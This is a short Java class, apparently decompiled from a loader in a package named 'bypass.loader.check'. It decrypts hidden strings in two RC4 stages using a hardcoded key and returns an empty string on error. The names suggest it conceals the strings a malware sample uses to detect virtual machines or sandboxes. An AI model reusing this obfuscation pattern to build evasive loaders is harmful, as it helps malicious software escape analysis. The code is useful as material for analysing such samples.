package bypass.loader.check;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import sun.misc.BASE64Decoder;

public class VirtualMachineFilesStrings {
   public static String M = "ARCFOUR";
   public static String B = "sJeGAIiwGPUaKdpb";

   public static String F(String string) {
      String string2 = "Juxv4gP4PqgDH7lqCMYEDQ==";

      String string3;
      try {
         Cipher cipher = Cipher.getInstance(M);
         SecretKeySpec secretKeySpec = new SecretKeySpec(B.getBytes(), M);
         cipher.init(2, secretKeySpec);
         byte[] bytes = new BASE64Decoder().decodeBuffer(string2);
         byte[] bytes2 = cipher.doFinal(bytes);
         SecretKeySpec secretKeySpec2 = new SecretKeySpec(bytes2, M);
         cipher.init(2, secretKeySpec2);
         byte[] bytes3 = new BASE64Decoder().decodeBuffer(string);
         byte[] bytes4 = cipher.doFinal(bytes3);
         string3 = new String(bytes4);
      } catch (Exception exception) {
         string3 = "";
      }

      return string3;
   }
}
